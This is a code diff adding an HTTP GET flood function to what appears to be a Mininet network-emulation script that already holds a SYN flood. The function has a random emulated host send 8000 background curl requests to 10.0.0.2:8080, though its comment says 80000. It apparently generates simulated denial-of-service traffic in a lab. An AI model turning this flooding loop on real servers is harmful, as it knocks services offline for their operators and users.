@@ -33,6 +33,14 @@ def SYN_FLOOD(net):
     
     
     
+def HTTP_GETFLOOD(net):
+    src_list= ['h1','h3','h4','h5','h6','h7','h8','h9']
+    src_name=random.choice(src_list)
+    src = net.get(src_name)
+    
+    src.cmd('for i in {1..8000}; do curl -s http://10.0.0.2:8080 > /dev/null; done &')  
+    # this command is used to run a get method 80000 times ignoring the return text
+    
     
     
       
